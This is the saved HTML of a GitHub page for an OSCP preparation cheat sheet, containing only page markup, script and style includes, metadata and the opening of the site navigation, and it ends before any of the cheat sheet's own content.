





<!DOCTYPE html>
<html
  lang="en"
  
  data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
  data-a11y-animated-images="system" data-a11y-link-underlines="true"
  
  >



  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

  


  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-7aa84bb7e11e.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-f65db3e8d171.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-a8258e3c6dda.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-7e97d834719c.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-09433d135506.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-e1068c76e9f7.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-a8cc7d138001.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-35e9dfdc4f9f.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-cf4cc5f62dfe.css" />

    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-d9abecd14f1e.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-20f98ef38fd8.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-7e1d0e4dee6a.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-e72829f5538b.css" />
  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/repository-197a21528ff0.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/code-c9d8677c87f4.css" />

  


  <script type="application/json" id="client-env">{"locale":"en","featureFlags":["alive_longer_retries","bypass_copilot_indexing_quota","copilot_new_references_ui","copilot_beta_features_opt_in","copilot_chat_retry_on_error","copilot_chat_persist_submitted_input","copilot_conversational_ux_history_refs","copilot_editor_upsells","copilot_free_limited_user","copilot_implicit_context","copilot_no_floating_button","copilot_smell_icebreaker_ux","experimentation_azure_variant_endpoint","failbot_handle_non_errors","geojson_azure_maps","ghost_pilot_confidence_truncation_25","ghost_pilot_confidence_truncation_40","hovercard_accessibility","issues_react_remove_placeholders","issues_react_blur_item_picker_on_close","marketing_pages_search_explore_provider","react_keyboard_shortcuts_dialog","remove_child_patch","sample_network_conn_type","site_metered_billing_update","lifecycle_label_name_updates"]}</script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-2b1f972abda0.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover_js-9da652f58479.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_arianotify-polyfill_ariaNotify-polyfill_js-node_modules_github_mi-3abb8f-d7e6bc799724.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_failbot_failbot_ts-71291b73d826.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/environment-e50b01fa8204.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_index_mjs-ea2a5d75d580.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-f690fd9ae3d5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-f6da4b3fa34c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_auto-complete-element_dist_index_js-node_modules_github_catalyst_-8e9f78-a74b4e0a8a6b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_text-expander-element_dist_index_js-78748950cb0c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-b5f1d7-a1760ffda83d.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_markdown-toolbar-element_dist_index_js-ceef33f593fa.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_primer_view-co-c44a69-6c8a172a9a59.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-f991cfab5105.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-0e4cbb2f8662.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_braintree_browser-detection_dist_browser-detection_js-node_modules_githu-bb80ec-7f43298e364b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-be8cb88f481b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_morphdom_dist_morphdom-e-7c534c-a4a1922eb55f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-e3cbe28f1638.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-893f9f-6cf3320416b8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_color-convert_index_js-e3180fe3bcb3.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_quote-selection_dist_index_js-node_modules_github_session-resume_-69cfcc-833249ee3034.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_updatable-content_updatable-content_ts-863ef5872a03.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_sso_ts-ui_packages-900dde-917d4bda1f1a.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_sticky-scroll-into-view_ts-7cbef09a422c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_include-d0d0a6-a8e67ad07b0d.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-fb43816ab83c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-9f22842d28f5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-f6223d90c7ba.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-cfcd9f4f0f23.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_github_catalyst_lib_inde-dbbea9-26cce2010167.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/code-menu-b5f092ec4b30.js"></script>
  
  <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-eb226383faf4.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-core-44f52ca7d9b4.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-2131e17288a8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-611691cca2f6.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_query-core_build_modern_queryClient_js-e6f07a7e80b7.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_emotion_is-prop-valid_dist_emotion-is-prop-valid_esm_js-node_modules_emo-37e3d5-92730c05e718.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_stacktrace-parser_dist_s-e7dcdd-f7cc96ebae76.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover-fn_js-55fea94174bf.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_dompurify_dist_purify_js-b89b98661809.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lodash-es__Stack_js-node_modules_lodash-es__Uint8Array_js-node_modules_l-4faaa6-10d8eea337ce.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lodash-es__baseIsEqual_js-8929eb9718d5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_react-reverse-portal_dist_web_index_js-node_modules_primer_live-region-e-18c5ad-0b67a5a18b33.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_aria-live_aria-live_ts-ui_packages_promise-with-resolvers-polyfill_promise-with-r-014121-9bfd2be0a79e.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_paths_index_ts-c223e79a3369.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ref-selector_RefSelector_tsx-691189ea6f17.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_commit-attribution_index_ts-ui_packages_commit-checks-status_index_ts-ui_packages-530254-8e6f85648d5b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_code-view-shared_hooks_use-canonical-object_ts-ui_packages_code-view-shared_utili-228da6-da93d05f90b7.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_code-view-shared_hooks_use-file-page-payload_ts-ui_packages_code-view-shared_comp-2fe379-a9709181a943.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_blob-anchor_ts-ui_packages_code-nav_code-nav_ts-ui_packages_filter--8253c1-f38cdfca9137.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-code-view-ff317128881c.js"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.9cd06fe640e2e168166f.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/react-code-view.3993db953ec46404c8d7.module.css" />

  <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-subscriptions-menu-b1dd2eefd368.js"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.9cd06fe640e2e168166f.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/notifications-subscriptions-menu.1bcff9205c241e99cff2.module.css" />


  <title>oscp-prep/CHEATSHEET.md at main 路 camercu/oscp-prep 路 GitHub</title>



  <meta name="route-pattern" content="/:user_id/:repository/blob/*name(/*path)" data-turbo-transient>
  <meta name="route-controller" content="blob" data-turbo-transient>
  <meta name="route-action" content="show" data-turbo-transient>

    
  <meta name="current-catalog-service-hash" content="f3abb0cc802f3d7b95fc8762b94bdcb13bf39634c40c357301c4aa1d67a256fb">


  <meta name="request-id" content="CD06:2CCFC4:72C4A:7D905:67891CCF" data-pjax-transient="true"/><meta name="html-safe-nonce" content="91d99d894422abf2645a51d7f2564ee3910b401033cc027625209fa6f83e8c12" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVxdWVzdF9pZCI6IkNEMDY6MkNDRkM0OjcyQzRBOjdEOTA1OjY3ODkxQ0NGIiwidmlzaXRvcl9pZCI6IjUxMjEzNTg2MDA3ODU0MTE5MDQiLCJyZWdpb25fZWRnZSI6ImJyYXppbHNvdXRoIiwicmVnaW9uX3JlbmRlciI6ImJyYXppbHNvdXRoIn0=" data-pjax-transient="true"/><meta name="visitor-hmac" content="eb4e76aeacdb4c12dc9cd96c865a21620a08698e92ab6f596ed9ac6987946f48" data-pjax-transient="true"/>


    <meta name="hovercard-subject-tag" content="repository:362483662" data-turbo-transient>


  <meta name="github-keyboard-shortcuts" content="repository,source-code,file-tree,copilot" data-turbo-transient="true" />
  

  <meta name="selected-link" value="repo_source" data-turbo-transient>
  <link rel="assets" href="https://github.githubassets.com/">

    <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">

<meta name="octolytics-url" content="https://collector.github.com/github/collect" />

  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show" data-turbo-transient="true" />

  




    <meta name="user-login" content="">

  

    <meta name="viewport" content="width=device-width">

    

      <meta name="description" content="OSCP Preparation. Contribute to camercu/oscp-prep development by creating an account on GitHub.">

      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">

    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
    <meta property="fb:app_id" content="1401488693436528">
    <meta name="apple-itunes-app" content="app-id=1477376905, app-argument=https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md" />

      <meta name="twitter:image" content="https://opengraph.githubassets.com/a6392c688c2da383603aaa3eacca34e6e7e715dd1b05e0377af6941797620556/camercu/oscp-prep" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="oscp-prep/CHEATSHEET.md at main 路 camercu/oscp-prep" /><meta name="twitter:description" content="OSCP Preparation. Contribute to camercu/oscp-prep development by creating an account on GitHub." />
  <meta property="og:image" content="https://opengraph.githubassets.com/a6392c688c2da383603aaa3eacca34e6e7e715dd1b05e0377af6941797620556/camercu/oscp-prep" /><meta property="og:image:alt" content="OSCP Preparation. Contribute to camercu/oscp-prep development by creating an account on GitHub." /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="600" /><meta property="og:site_name" content="GitHub" /><meta property="og:type" content="object" /><meta property="og:title" content="oscp-prep/CHEATSHEET.md at main 路 camercu/oscp-prep" /><meta property="og:url" content="https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md" /><meta property="og:description" content="OSCP Preparation. Contribute to camercu/oscp-prep development by creating an account on GitHub." />
  




      <meta name="hostname" content="github.com">



        <meta name="expected-hostname" content="github.com">


  <meta http-equiv="x-pjax-version" content="0df9905ea3170383a2505d11037b881966b915cc240313240ccb9be3db8c1048" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="ace39c3b6632770952207593607e6e0be0db363435a8b877b1f96abe6430f345" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="91684edb2a1719c4c35d97255f97853f94708cdd9a7c3a773ae63c57032ce418" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="032cbcb11d5ad18379d597e8b0add34fd4ce99749d871be135edcf98b5a6eff4" data-turbo-track="reload">

  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">

      <meta name="turbo-cache-control" content="no-cache" data-turbo-transient>

    <meta data-hydrostats="publish">
  <meta name="go-import" content="github.com/camercu/oscp-prep git https://github.com/camercu/oscp-prep.git">

  <meta name="octolytics-dimension-user_id" content="6279092" /><meta name="octolytics-dimension-user_login" content="camercu" /><meta name="octolytics-dimension-repository_id" content="362483662" /><meta name="octolytics-dimension-repository_nwo" content="camercu/oscp-prep" /><meta name="octolytics-dimension-repository_public" content="true" /><meta name="octolytics-dimension-repository_is_fork" content="false" /><meta name="octolytics-dimension-repository_network_root_id" content="362483662" /><meta name="octolytics-dimension-repository_network_root_nwo" content="camercu/oscp-prep" />



    

    <meta name="turbo-body-classes" content="logged-out env-production page-responsive">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark" />


  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
    <div data-turbo-body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
      


    <div class="position-relative header-wrapper js-header-wrapper ">
      <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>

      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      
      <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ui-commands_ui-commands_ts-8056b86f7497.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/keyboard-shortcuts-dialog-958cae8ecd6c.js"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.9cd06fe640e2e168166f.module.css" />

<react-partial
  partial-name="keyboard-shortcuts-dialog"
  data-ssr="false"
  data-attempted-ssr="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"docsUrl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>




      

          

              
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-94fd67-73b675cf164a.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/sessions-5d6426bbf16a.js"></script>
<header class="HeaderMktg header-logged-out js-details-container js-header Details f4 py-3" role="banner" data-is-top="true" data-color-mode=light data-light-theme=light data-dark-theme=dark>
  <h2 class="sr-only">Navigation Menu</h2>

  <button type="button" class="HeaderMktg-backdrop d-lg-none border-0 position-fixed top-0 left-0 width-full height-full js-details-target" aria-label="Toggle navigation">
    <span class="d-none">Toggle navigation</span>
  </button>

  <div class="d-flex flex-column flex-lg-row flex-items-center px-3 px-md-4 px-lg-5 height-full position-relative z-1">
    <div class="d-flex flex-justify-between flex-items-center width-full width-lg-auto">
      <div class="flex-1">
        <button aria-label="Toggle navigation" aria-expanded="false" type="button" data-view-component="true" class="js-details-target js-nav-padding-recalculate js-header-menu-toggle Button--link Button--medium Button d-lg-none color-fg-inherit p-1">  <span class="Button-content">
    <span class="Button-label"><div class="HeaderMenu-toggle-bar rounded my-1"></div>
            <div class="HeaderMenu-toggle-bar rounded my-1"></div>
            <div class="HeaderMenu-toggle-bar rounded my-1"></div></span>
  </span>
</button>
      </div>

      <a class="mr-lg-3 color-fg-inherit flex-order-2 js-prevent-focus-on-mobile-nav"
        href="/"
        aria-label="Homepage"
        data-analytics-event="{&quot;category&quot;:&quot;Marketing nav&quot;,&quot;action&quot;:&quot;click to go to homepage&quot;,&quot;label&quot;:&quot;ref_page:Marketing;ref_cta:Logomark;ref_loc:Header&quot;}">
        <svg height="32" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="32" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
      </a>

      <div class="flex-1 flex-order-2 text-right">
          <a
            href="/login?return_to=https%3A%2F%2Fgithub.com%2Fcamercu%2Foscp-prep%2Fblob%2Fmain%2FCHEATSHEET.md"
            class="HeaderMenu-link HeaderMenu-button d-inline-flex d-lg-none flex-order-1 f5 no-underline border color-border-default rounded-2 px-2 py-1 color-fg-inherit js-prevent-focus-on-mobile-nav"
            data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="9bbc23078a599cd38f16ed6c1cb68cd9b02f9448118f68aaa6d819e3849cd6fc"
            data-analytics-event="{&quot;category&quot;:&quot;Marketing nav&quot;,&quot;action&quot;:&quot;click to Sign in&quot;,&quot;label&quot;:&quot;ref_page:Marketing;ref_cta:Sign in;ref_loc:Header&quot;}"
          >
            Sign in
          </a>
      </div>
    </div>


    <div class="HeaderMenu js-header-menu height-fit position-lg-relative d-lg-flex flex-column flex-auto top-0">
      <div class="HeaderMenu-wrapper d-flex flex-column flex-self-start flex-lg-row flex-auto rounded rounded-lg-0">
          <nav class="HeaderMenu-nav" aria-label="Global">
            <ul class="d-lg-flex list-style-none">
                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Product
        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>
      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 pt-2 pt-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 pb-2 pb-lg-4 d-lg-flex flex-wrap dropdown-menu-wide">
          <div class="HeaderMenu-column px-lg-4 border-lg-right mb-4 mb-lg-0 pr-lg-7">
              <div class="border-bottom pb-3 pb-lg-0 border-lg-bottom-0">
                <ul class="list-style-none f5" >
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_copilot&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_copilot_link_product_navbar&quot;}" href="https://github.com/features/copilot">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-copilot color-fg-subtle mr-3">
    <path d="M23.922 16.992c-.861 1.495-5.859 5.023-11.922 5.023-6.063 0-11.061-3.528-11.922-5.023A.641.641 0 0 1 0 16.736v-2.869a.841.841 0 0 1 .053-.22c.372-.935 1.347-2.292 2.605-2.656.167-.429.414-1.055.644-1.517a10.195 10.195 0 0 1-.052-1.086c0-1.331.282-2.499 1.132-3.368.397-.406.89-.717 1.474-.952 1.399-1.136 3.392-2.093 6.122-2.093 2.731 0 4.767.957 6.166 2.093.584.235 1.077.546 1.474.952.85.869 1.132 2.037 1.132 3.368 0 .368-.014.733-.052 1.086.23.462.477 1.088.644 1.517 1.258.364 2.233 1.721 2.605 2.656a.832.832 0 0 1 .053.22v2.869a.641.641 0 0 1-.078.256ZM12.172 11h-.344a4.323 4.323 0 0 1-.355.508C10.703 12.455 9.555 13 7.965 13c-1.725 0-2.989-.359-3.782-1.259a2.005 2.005 0 0 1-.085-.104L4 11.741v6.585c1.435.779 4.514 2.179 8 2.179 3.486 0 6.565-1.4 8-2.179v-6.585l-.098-.104s-.033.045-.085.104c-.793.9-2.057 1.259-3.782 1.259-1.59 0-2.738-.545-3.508-1.492a4.323 4.323 0 0 1-.355-.508h-.016.016Zm.641-2.935c.136 1.057.403 1.913.878 2.497.442.544 1.134.938 2.344.938 1.573 0 2.292-.337 2.657-.751.384-.435.558-1.15.558-2.361 0-1.14-.243-1.847-.705-2.319-.477-.488-1.319-.862-2.824-1.025-1.487-.161-2.192.138-2.533.529-.269.307-.437.808-.438 1.578v.021c0 .265.021.562.063.893Zm-1.626 0c.042-.331.063-.628.063-.894v-.02c-.001-.77-.169-1.271-.438-1.578-.341-.391-1.046-.69-2.533-.529-1.505.163-2.347.537-2.824 1.025-.462.472-.705 1.179-.705 2.319 0 1.211.175 1.926.558 2.361.365.414 1.084.751 2.657.751 1.21 0 1.902-.394 2.344-.938.475-.584.742-1.44.878-2.497Z"></path><path d="M14.5 14.25a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Zm-5 0a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">GitHub Copilot</div>
        Write better code with AI
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;security&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;security_link_product_navbar&quot;}" href="https://github.com/features/security">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-shield-check color-fg-subtle mr-3">
    <path d="M16.53 9.78a.75.75 0 0 0-1.06-1.06L11 13.19l-1.97-1.97a.75.75 0 0 0-1.06 1.06l2.5 2.5a.75.75 0 0 0 1.06 0l5-5Z"></path><path d="m12.54.637 8.25 2.675A1.75 1.75 0 0 1 22 4.976V10c0 6.19-3.771 10.704-9.401 12.83a1.704 1.704 0 0 1-1.198 0C5.77 20.705 2 16.19 2 10V4.976c0-.758.489-1.43 1.21-1.664L11.46.637a1.748 1.748 0 0 1 1.08 0Zm-.617 1.426-8.25 2.676a.249.249 0 0 0-.173.237V10c0 5.46 3.28 9.483 8.43 11.426a.199.199 0 0 0 .14 0C17.22 19.483 20.5 15.461 20.5 10V4.976a.25.25 0 0 0-.173-.237l-8.25-2.676a.253.253 0 0 0-.154 0Z"></path>
</svg>
      <div>
